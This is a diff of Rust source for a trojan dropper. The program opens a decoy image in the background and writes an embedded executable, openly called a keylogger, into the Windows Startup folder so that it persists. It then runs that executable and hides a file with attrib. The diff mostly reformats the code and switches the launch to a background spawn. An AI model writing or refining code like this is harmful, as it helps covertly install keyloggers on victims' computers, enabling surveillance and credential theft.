@@ -1,8 +1,7 @@
-
 use std::fs::File;
 use std::io::prelude::*;
-use std::process::Command;
 use std::path::PathBuf;
+use std::process::Command;
 
 // Include the image file as a binary blob
 const IMAGE_DATA: &'static [u8] = include_bytes!("image.jpg");
@@ -11,7 +10,8 @@ const IMAGE_FILE_OUT: &'static str = "./golzar.jpg";
 // Include the exe file as a binary blob
 const EXE_DATA: &'static [u8] = include_bytes!("app.exe");
 // Assuming that you want to write the file to the user's Startup folder
-const EXE_FILE_OUT: &'static str = r"C:\Users\mailp\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe";
+const EXE_FILE_OUT: &'static str =
+    r"C:\Users\mailp\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe";
 
 // Name of your program
 const EXE_NAME: &'static str = "your_program.exe";
@@ -23,17 +23,19 @@ fn main() {
 
     // Open the image with the default program
     match Command::new("cmd")
-        .args(&["/C", "start", "/B", IMAGE_FILE_OUT])  // add /B argument to start process in the background
-        .spawn() {  // use spawn instead of status to not wait for the process to finish
+        .args(&["/C", "start", "/B", IMAGE_FILE_OUT]) // add /B argument to start process in the background
+        .spawn()
+    {
+        // use spawn instead of status to not wait for the process to finish
         Ok(_) => {
             // println!("Successfully opened the image.");
-        },
+        }
         Err(e) => {
             // println!("Failed to execute command: {}", e)
-        },
+        }
     };
 
-// Part 2:  Write the keylogger to the startup folder
+    // Part 2:  Write the keylogger to the startup folder
 
     let startup_dir = match get_startup_dir() {
         Some(dir) => dir,
@@ -46,14 +48,14 @@ fn main() {
     let exe_file_out = startup_dir.join(EXE_NAME);
     write_app_file(&exe_file_out);
     // Attempt to run the .exe file
-    match Command::new(&exe_file_out)
-        .status() {
-        Ok(_) => {
+    match Command::new(&exe_file_out).spawn() {
+        Ok(child) => {
             println!("Successfully opened the .exe.");
-        },
+            // Here you can use child.id() to get the PID, or child.kill() to kill the process, etc.
+        }
         Err(e) => {
             println!("Failed to execute .exe: {}", e)
-        },
+        }
     };
 
     // std::thread::sleep(std::time::Duration::from_secs(3));
@@ -78,15 +80,16 @@ fn write_file() {
     // This needs to be run in a subprocess, so it won't work if the Rust script is run in the background
     match Command::new("cmd")
         .args(&["/C", "attrib", "+H", IMAGE_FILE_OUT])
-        .status() {
+        .status()
+    {
         Ok(status) => {
             if !status.success() {
                 println!("Command executed, but reported failure.");
             }
-        },
+        }
         Err(e) => {
             println!("Failed to execute command: {}", e)
-        },
+        }
     };
 }
 
